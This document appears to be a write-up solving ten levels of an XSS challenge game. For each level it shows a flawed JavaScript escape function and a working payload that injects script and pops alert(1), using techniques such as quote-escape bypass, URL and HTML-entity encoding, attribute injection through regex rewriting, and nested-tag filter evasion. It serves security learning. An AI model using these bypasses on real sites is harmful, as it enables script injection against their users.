## 1)WarmUp

```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

Any noob can solve this question, the simplistic task. Just close the console function and then create a new script to alert.

`")</script><script>alert(1)</script>"`

## 2)Adobe

```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

In this task, our quote “ is escaped by a backslash. However, we can still use one more backslash \ to make the quote functional, like this:

`\"</script><script>alert(1)</script>"`

## 3)Json

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

We know that JSON.stringify would not escape parentheses or slash. Thus, just utilize them to close the previous tag and create new one:

`</script><script>alert(1)</script>`

## 4)Javascript

```javascript
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);
  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```

Seems terrible, it’s not possible to create tag in javascript protocol and quotation is escaped. But remember this is a URL, we can use URL encode to close the console and execute javascript expression:

`%22+alert(1)+%22`

## 5)Markdown

```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

The question seems complicated, em, it spends a little time for me to fully understand the code. In this case, you cannot create a new tag. However, we can use the regex to create new event handler in the tag.
We can apparently find out that the string follows `http://` in description `[[some text|description]]` will be created in href or alt in the new tag. Also, quotations are added when creating. If we can end the alt or href and use following text to create event handler, then, alerting is achieved:

`[[x|http://onerror='alert(1)']]`

Here is the html returned by escape(s):

`<img alt="<a href="http://onerror='alert(1)'" src="x.gif">">http://onerror='alert(1)']]</a>`

Because both alt and href will create a quotation at the begging, the </a href= is recognized as a property. What’s more, the text ‘onerror’ is not surronded by quotations and thus is treated as event handler. Please notice that we must have src property, otherwise, the onerror will not be triggered.

## 6)DOM

```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);
  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

The code may be strange, but if you know that the method in a object can be called by exampleMethod and a proper function begging with create, it would be not difficult.
Many createXXX fucntion disallow us to pass a tag or create a tag with event listener. In this case, I choose createComment, which allow us to disclose the comment tag and create own tag.

`Comment#--><img src=a onerror=alert(1)><!--`

## 7)Callback

```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);
  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

We can create a new script inside and use single quotaion to end the JSON. Then, comment the false javascript grammar part:

`<script>'({"userdata":"';alert(1)//"})</script>`

## 8)Skandia

```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
toUpperCase, em, we cannot use javascript function properly. However, it’s legal to use html encode to excute event listener in tag. As a result, we merely need to encode alert(1):

`")</script><img src=a onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29; ><script>("`

## 9)Template

```javascript
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }
  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g,
        function(_, n) {
           return htmlEscape(args[n]);
         });
  }
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```
OMG, so many chracters are escaped. But don’t worry, the innerHTML is a javascript string. Just use javascript encode, alert:
`\u003cimg src=a onerror=alert(1)\u003e`

## 10)JSON(2)
Em, a high level JSON quetion. The </script is elimated according to regex. However, the escape function only checks in once. To utilize the feature, we can create <script> that contains </script inside to bypass the function:

`</scr</scriptipt><script>alert(1)</scr</scriptipt><script>`
